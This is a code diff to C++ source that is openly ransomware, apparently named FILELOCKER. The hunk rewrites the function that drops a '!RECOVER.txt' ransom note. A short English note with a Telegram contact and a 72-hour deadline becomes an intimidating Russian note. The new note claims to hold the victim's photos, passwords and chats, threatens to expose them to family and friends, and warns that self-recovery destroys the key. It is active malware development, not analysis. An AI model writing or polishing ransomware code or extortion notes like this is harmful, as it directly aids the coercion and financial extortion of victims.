@@ -41,12 +41,17 @@ static void WriteNote(const fs::path& dir, const std::string& id) {
     fs::path note = dir / L"!RECOVER.txt";
     if (fs::exists(note)) return;
     std::ofstream f(note);
-    f << "=== FILELOCKER ===\n\n"
-      << "Your files are encrypted with AES-256.\n"
-      << "Your ID: " << id << "\n\n"
-      << "Contact: @flk_recover (Telegram)\n"
-      << "Do not rename files. Do not power off.\n"
-      << "You have 72 hours.\n";
+    f << "========================================\n\n";
+    f << "ВСЕ ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ.\n";
+    f << "ТВОЯ ЦИФРОВАЯ ЖИЗНЬ ТЕПЕРЬ ПРИНАДЛЕЖИТ МНЕ.\n\n";
+    f << "Я ЗНАЮ О ТЕБЕ ВСЁ.\n";
+    f << "ВСЕ ТВОИ ФОТО, ПАРОЛИ, ПЕРЕПИСКИ И ДОКУМЕНТЫ - У МЕНЯ.\n\n";
+    f << "ЕСЛИ НЕ ХОЧЕШЬ, ЧТОБЫ ТВОЙ ID УЛЕТЕЛ В СЕТЬ, ЧТОБЫ О ТЕБЕ\n";
+    f << "УЗНАЛИ ВСЕ ТВОИ ДРУЗЬЯ И СЕМЬЯ - У ТЕБЯ 72 ЧАСА.\n";
+    f << "ПОПЫТАЕШЬСЯ ВОССТАНОВИТЬ САМ - КЛЮЧ СГОРИТ НАВСЕГДА.\n\n";
+    f << "СВЯЗЬ: @flk_recover (Telegram)\n";
+    f << "ТВОЙ ID: " << id << "\n\n";
+    f << "========================================\n";
 }
 
 int wmain(int argc, wchar_t** argv) {
